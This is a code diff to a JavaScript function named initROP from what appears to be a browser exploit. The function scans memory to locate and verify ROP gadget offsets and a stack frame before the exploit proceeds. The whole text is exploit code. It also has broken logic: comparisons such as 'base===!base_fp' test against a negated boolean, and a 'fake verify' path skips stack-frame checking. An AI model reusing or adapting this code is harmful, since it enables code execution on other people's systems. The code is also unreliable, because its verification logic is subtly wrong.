@@ -117,30 +117,48 @@ function initROP()
 		if (verify_offsets)
 		{
 			base=checkMemory(base_fp_addr-0x4,0x100,base_fp.length,6);
+			if(base===base_fp){base_verified=true;base_fp_acolor=colorVerified;}
 			j2=checkMemory(jump_2_addr-0x4,0x100,jump_2.length,6);
+			if(j2===jump_2){j2_verified=true;jump_2_acolor=colorVerified;}
 			j1=checkMemory(jump_1_addr-0x4,0x100,jump_1.length,6);
+			if(j1===jump_1){j1_verified=true;jump_1_acolor=colorVerified;}
+			
 			
 			// Verify Stackframe
 			if(verify_stackframe)
 			{
 				stk=checkMemory(stack_frame_addr-0x4,0x100,stack_frame.length,6);
+				//stk=checkMemory(stack_frame_addr-0x4,0x100,0x200,6);
+				if(stk===stack_frame)
+				{
+					stackframe_verified=true;
+					stack_frame_acolor=colorVerified;
+				}
 			}
 			else
 			{
 				stackframe_verified=true;// fake verify
+				stk_verified_fake=true;
+				stack_frame_acolor=colorVerifiedFake;
 			}
 			
 			// Verify Offsets
-			if((j2===jump_2)&&(j1===jump_1)&&(base===base_fp)&&((stk===stack_frame)||(stackframe_verified))){allOffsetsVerified=true;}
+			//if((j2===jump_2)&&(j1===jump_1)&&(base===base_fp)&&((stk===stack_frame)||(stackframe_verified))){allOffsetsVerified=true;}
+			//if((j2_verified)&&(j1_verified)&&(base_verified)&&((stackframe_verified)||(stk_verified_fake))){allOffsetsVerified=true;}
 			
-			//if(j2===jump_2){j2_verified=true;}
-			//if(j1===jump_1){j1_verified=true;}
-			//if(base===base_fp){base_verified=true;}
-			//if(stk===stack_frame){stk_verified=true;}
+			// Check each one and reset bad ones
+			if(!allOffsetsVerified)
+			{
+				if(base===!base_fp){base_verified=false;base_found=false;base_fp_acolor=colorSuccess;}
+				if(j2===!jump_2){j2_verified=false;j2_found=false;jump_2_acolor=colorSuccess;}
+				if(j1===!jump_1){j1_verified=false;j1_found=false;jump_1_acolor=colorSuccess;}
+				//if(stk===!stack_frame){stackframe_verified=false;stk_found=false;stack_frame_acolor=colorSuccess;}
+			}
 			
-			//if((j2_verified)&&(j1_verified)&&(base_verified)&&(stk_verified)){allOffsetsVerified=true;}
 			
-			if(allOffsetsVerified)
+			// Land here ONLY when all offsets are verified
+			//if(allOffsetsVerified)
+			if((j2_verified)&&(j1_verified)&&(base_verified)&&(stackframe_verified))
 			{
 				if(debug_mode)logAdd(verify_success);
 				if(t_out!=0){searchResetTimeout();}
